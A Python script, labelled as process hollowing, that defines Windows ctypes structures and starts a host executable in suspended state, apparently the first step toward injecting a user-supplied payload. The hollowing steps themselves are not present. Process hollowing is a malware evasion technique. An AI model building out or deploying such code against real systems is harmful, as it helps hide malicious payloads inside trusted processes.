import argparse
from ctypes import *

from pefile import PE


class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess', c_void_p),
        ('hThread', c_void_p),
        ('dwProcessId', c_ulong),
        ('dwThreadId', c_ulong)
    ]


class STARTUPINFO(Structure):
    _fields_ = [
        ('cb', c_ulong),
        ('lpReserved', c_char_p),
        ('lpDesktop', c_char_p),
        ('lpTitle', c_char_p),
        ('dwX', c_ulong),
        ('dwY', c_ulong),
        ('dwXSize', c_ulong),
        ('dwYSize', c_ulong),
        ('dwXCountChars', c_ulong),
        ('dwYCountChars', c_ulong),
        ('dwFillAttribute', c_ulong),
        ('dwFlags', c_ulong),
        ('wShowWindow', c_ushort),
        ('cbReserved2', c_ushort),
        ('lpReserved2', c_ulong),
        ('hStdInput', c_void_p),
        ('hStdOutput', c_void_p),
        ('hStdError', c_void_p)
    ]


class FLOATING_SAVE_AREA(Structure):
    _fields_ = [
        ("ControlWord", c_ulong),
        ("StatusWord", c_ulong),
        ("TagWord", c_ulong),
        ("ErrorOffset", c_ulong),
        ("ErrorSelector", c_ulong),
        ("DataOffset", c_ulong),
        ("DataSelector", c_ulong),
        ("RegisterArea", c_ubyte * 80),
        ("Cr0NpxState", c_ulong)
    ]


class CONTEXT(Structure):
    _fields_ = [
        ("ContextFlags", c_ulong),
        ("Dr0", c_ulong),
        ("Dr1", c_ulong),
        ("Dr2", c_ulong),
        ("Dr3", c_ulong),
        ("Dr6", c_ulong),
        ("Dr7", c_ulong),
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", c_ulong),
        ("SegFs", c_ulong),
        ("SegEs", c_ulong),
        ("SegDs", c_ulong),
        ("Edi", c_ulong),
        ("Esi", c_ulong),
        ("Ebx", c_ulong),
        ("Edx", c_ulong),
        ("Ecx", c_ulong),
        ("Eax", c_ulong),
        ("Ebp", c_ulong),
        ("Eip", c_ulong),
        ("SegCs", c_ulong),
        ("EFlags", c_ulong),
        ("Esp", c_ulong),
        ("SegSs", c_ulong),
        ("ExtendedRegisters", c_ubyte * 512)
    ]


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="Process Hollowing using Python")
    parser.add_argument('-p', help="Path to payload", required=True)
    parser.add_argument('-d', help="Path to host executable", required=True)

    args = parser.parse_args()

    si = STARTUPINFO()
    si.cb = sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()

    CREATE_SUSPENDED = 0x0004

    if windll.kernel32.CreateProcessW(
            None,
            args.d,
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            byref(si),
            byref(pi)):
        err = windll.kernel32.GetLastError()
        hProcess = pi.hProcess
        hThread = pi.hThread

        print(f"Last error {err}")
        print(f"New suspended process: {pi.dwProcessId}")
